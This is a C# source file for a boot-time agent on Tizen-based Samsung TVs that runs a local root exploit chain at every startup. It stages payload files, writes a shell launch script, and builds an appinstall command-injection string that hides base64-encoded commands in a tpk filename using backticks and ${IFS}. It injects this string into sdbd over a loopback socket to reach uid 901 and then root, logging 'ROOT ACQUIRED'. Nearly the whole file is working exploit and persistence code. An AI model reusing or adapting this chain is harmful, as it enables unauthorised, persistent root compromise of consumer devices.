using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BootAgent
{
    /// <summary>
    /// Headless boot agent — runs as a dotnet-inhouse svcapp at every boot.
    ///
    /// Chain:
    ///   app-boot-manager -> aul -> this IL (uid 5001, User::Pkg::*)
    ///   -> TCP 127.0.0.1:26101 -> sdbd
    ///   -> SVE-2025-50109 appinstall injection (uid 901, System label)
    ///   -> cat launch.sh | bash (UEP-safe stdin bypass)
    ///   -> /usr/bin/dotnet SamsungTvArchiveRoot.dll (cap_setuid)
    ///   -> uid 0 root shell -> modules
    ///
    /// No NUI, no window — management is via tizen-ssh or the bridge relay.
    /// </summary>
    public static class Program
    {
        // ── paths ──────────────────────────────────────────────────────────
        // Res: chain artifacts staged inside the squatted app's res/ dir.
        // These are root-created files placed during initial deployment.
        private const string DefaultAppId = "com.samsung.tv.ghservice";
        private static readonly string Res = "/opt/usr/apps/" + DefaultAppId + "/res/selfroot";
        private const string AppHome = "/tmp/selfroot-app";
        private const string Pkg = "archive-root-00b0000000000001";
        private const string Staging = "/home/owner/share/tmp/sdk_tools/" + Pkg;
        private const string OnDemand = "/home/owner/share/tmp/sdk_tools/on-demand";
        private const string Evidence = "/home/owner/share/tmp/sdk_tools/selfroot-evidence";
        private const string Mark = "/tmp/selfroot";
        private const string SafeModeFile = "/opt/usr/share/selfroot/safe-mode";
        private const string ModuleRoot = "/opt/usr/share/selfroot/modules";

        // ── timing ─────────────────────────────────────────────────────────
        // sdbd caches the dev host IP at startup; retrying past its boot
        // window is pointless. 18 attempts × 10s = 3 minutes.
        private const int SessionAttempts = 18;
        private const int SessionRetryMs = 10000;
        // Proof poll: 120 × 3s = 6 minutes (modules can take a while).
        private const int ProofPollAttempts = 120;
        private const int ProofPollMs = 3000;

        private static readonly object LogLock = new object();

        // ── logging ────────────────────────────────────────────────────────
        private static void Log(string message)
        {
            var line = "[" + DateTime.UtcNow.ToString("o") + "] " + message;
            Console.WriteLine(line);
            try
            {
                Directory.CreateDirectory(Evidence);
                File.AppendAllText(Evidence + "/agent.log", line + "\n");
            }
            catch { }
        }

        // ── chain ──────────────────────────────────────────────────────────
        public static void RunChain()
        {
            var bootStarted = DateTime.UtcNow;
            try
            {
                Directory.CreateDirectory(Mark);
                Directory.CreateDirectory(AppHome);

                // Identity snapshot for diagnostics.
                var status = new StringBuilder();
                try
                {
                    foreach (var line in File.ReadAllLines("/proc/self/status"))
                    {
                        if (line.StartsWith("Name:", StringComparison.Ordinal)
                            || line.StartsWith("Uid:", StringComparison.Ordinal)
                            || line.StartsWith("Cap", StringComparison.Ordinal))
                        {
                            status.Append(line.Trim()).Append(' ');
                        }
                    }
                }
                catch { }
                try
                {
                    status.Append("label=")
                        .Append(File.ReadAllText("/proc/self/attr/current").Trim());
                }
                catch { }
                Log("boot agent started - " + status);

                // ── safe mode ──────────────────────────────────────────────
                if (File.Exists(SafeModeFile))
                {
                    Log("safe-mode flag present: chain skipped");
                    return;
                }

                // ── reopen fast-path ───────────────────────────────────────
                // If this boot already produced a fresh proof, skip the
                // injection entirely. Makes the agent re-launchable without
                // re-running the chain.
                if (HasFreshProof(bootStarted))
                {
                    Log("this boot already rooted (fresh proof exists) - chain skipped");
                    return;
                }

                // ── stage chain artifacts ──────────────────────────────────
                foreach (var name in new[]
                {
                    "SamsungTvArchiveRoot.dll",
                    "SamsungTvArchiveRoot.runtimeconfig.json",
                    "public.pem",
                    "passwd",
                    Pkg + ".tar.gz",
                    Pkg + ".tar.gz.signature",
                })
                {
                    var src = Path.Combine(Res, name);
                    var dst = Path.Combine(AppHome, name);
                    if (File.Exists(src))
                        File.Copy(src, dst, true);
                    else
                        Log("missing: " + src);
                }
                Log("staged chain artifacts -> " + AppHome);

                // ── build the outer launch script ──────────────────────────
                // This is the script that runs as uid 901 (System label) via
                // the sdbd injection. It stages artifacts, invokes the
                // archive-root payload, and runs modules.
                var outer = new StringBuilder()
                    .Append("#!/bin/sh\n")
                    .Append("exec 2>&1\n")
                    .Append("EV=").Append(Evidence).Append("\n")
                    .Append("mkdir -p \"$EV\" 2>/dev/null\n")
                    .Append("chmod 0777 \"$EV\" 2>/dev/null\n")
                    .Append("chsmack -a _ \"$EV\" 2>/dev/null\n")
                    // Pre-create agent.log with app-writable SMACK label so
                    // the agent (User::Pkg::*) can append to it later.
                    .Append("touch \"$EV/agent.log\" 2>/dev/null\n")
                    .Append("chmod 666 \"$EV/agent.log\" 2>/dev/null\n")
                    .Append("chsmack -a 'User::App::Shared' \"$EV/agent.log\" 2>/dev/null\n")
                    .Append("{\n")
                    .Append("  date\n")
                    .Append("  id\n")
                    .Append("  cat /proc/self/attr/current\n")
                    // Stage the payload artifacts where sdbd's context can write.
                    .Append("  mkdir -p ").Append(Staging).Append(" ").Append(OnDemand).Append(" 2>/dev/null\n")
                    .Append("  cp ").Append(AppHome).Append("/SamsungTvArchiveRoot.dll ")
                        .Append(AppHome).Append("/SamsungTvArchiveRoot.runtimeconfig.json ")
                        .Append(AppHome).Append("/public.pem ")
                        .Append(AppHome).Append("/passwd ").Append(Staging).Append("/\n")
                    .Append("  cp ").Append(AppHome).Append("/").Append(Pkg).Append(".tar.gz ")
                        .Append(AppHome).Append("/").Append(Pkg).Append(".tar.gz.signature ")
                        .Append(OnDemand).Append("/\n")
                    // Run the archive-root payload to get uid 0.
                    .Append("  /usr/bin/dotnet ").Append(Staging)
                        .Append("/SamsungTvArchiveRoot.dll ").Append(Pkg)
                        .Append(" ").Append(Staging).Append(" ").Append(OnDemand).Append("\n")
                    .Append("  echo payload-exit=$?\n")
                    .Append("} > \"$EV/outer.log\" 2>&1\n")
                    .Append("chsmack -a _ \"$EV\"/* 2>/dev/null\n");
                File.WriteAllText(AppHome + "/selfroot-launch.sh", outer.ToString());
                Log("outer script staged (cat|bash, UEP-safe)");

                // ── build the injection argument ───────────────────────────
                // The appinstall injection uses base64-encoded command
                // substitution inside a tpk filename argument. The shell
                // injection must fit within 510 bytes.
                var token = "app" + ((uint)Environment.TickCount).ToString("x8");
                var wrapped = "/bin/mkdir /tmp/s-" + token + " 2>/dev/null&&{ cat "
                    + AppHome + "/selfroot-launch.sh|bash;}";
                var encoded = Convert.ToBase64String(Encoding.ASCII.GetBytes(wrapped));
                var argument = "0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}"
                    + encoded + "|base64${IFS}-d|bash`.tpk";

                if (argument.Length > 510)
                {
                    Log("FATAL: injection too big (" + argument.Length + "/510 bytes)");
                    return;
                }
                Log("injection armed (" + argument.Length + "/510 bytes)");

                // ── connect to sdbd ────────────────────────────────────────
                System.Net.Sockets.Socket s = null;
                int attempt = 0;
                while (attempt < SessionAttempts)
                {
                    attempt++;
                    if (attempt == 1 || attempt % 6 == 0)
                        Log("sdbd wait " + attempt + "/" + SessionAttempts
                            + " (dev IP must be 127.0.0.1)");

                    s = SdbClient.TryConnect(Log);
                    if (s != null) break;
                    Thread.Sleep(SessionRetryMs);
                }

                if (s == null)
                {
                    Log("no sdbd session in " + SessionAttempts
                        + " attempts — dev IP probably not 127.0.0.1");
                    return;
                }

                Log("sdbd session open (attempt " + attempt + ")");

                // ── capability handshake + injection ────────────────────────
                using (s)
                {
                    SdbClient.Capability(s, Log);
                    SdbClient.Inject(s, argument, Log);
                }

                Log("injection sent, polling for root proof...");

                // ── poll for proof ─────────────────────────────────────────
                for (int i = 0; i < ProofPollAttempts; i++)
                {
                    Thread.Sleep(ProofPollMs);
                    if (HasFreshProof(bootStarted))
                    {
                        Log("ROOT ACQUIRED — untethered boot root successful");
                        try
                        {
                            var proof = File.ReadAllText(Evidence + "/selfroot-proof.txt");
                            Log("PROOF:\n" + proof.Trim());
                        }
                        catch { }
                        return;
                    }
                    if (i > 0 && i % 20 == 0)
                        Log("still waiting for proof (" + (i * ProofPollMs / 1000) + "s)...");
                }

                Log("no proof after " + (ProofPollAttempts * ProofPollMs / 1000)
                    + "s — chain may have failed");
            }
            catch (Exception ex)
            {
                Log("chain error: " + ex.GetType().Name + ": " + ex.Message);
            }
        }

        /// <summary>
        /// Check whether a fresh root proof exists from this boot.
        /// </summary>
        private static bool HasFreshProof(DateTime bootStarted)
        {
            foreach (var path in new[]
            {
                Evidence + "/selfroot-proof.txt",
                "/tmp/selfroot-proof.txt",
            })
            {
                try
                {
                    if (!File.Exists(path)) continue;
                    if (File.GetLastWriteTimeUtc(path) < bootStarted.AddSeconds(-5)) continue;
                    var text = File.ReadAllText(path);
                    if (text.Contains("SELFROOT-PROOF uid=0"))
                        return true;
                }
                catch { }
            }
            return false;
        }

        // ── entry point ────────────────────────────────────────────────────
        // When the TV's framework DLLs are available, this runs as a Tizen
        // ServiceApplication via app-boot-manager. When built standalone
        // (without Tizen refs), it runs as a plain console app for testing.
        public static void Main(string[] args)
        {
#if TIZEN_SERVICE
            new BootService().Run(args);
#else
            // Standalone mode: run the chain directly and exit.
            Log("running in standalone mode (no Tizen service lifecycle)");
            RunChain();
#endif
        }
    }

#if TIZEN_SERVICE
    /// <summary>
    /// Tizen ServiceApplication subclass — the boot-manager launches this
    /// via aul into the launchpad .NET pool. OnCreate fires the chain on
    /// a background thread so the service lifecycle doesn't block.
    /// </summary>
    internal class BootService : Tizen.Applications.ServiceApplication
    {
        protected override void OnCreate()
        {
            base.OnCreate();
            Task.Run(() => Program.RunChain());
        }
    }
#endif
}
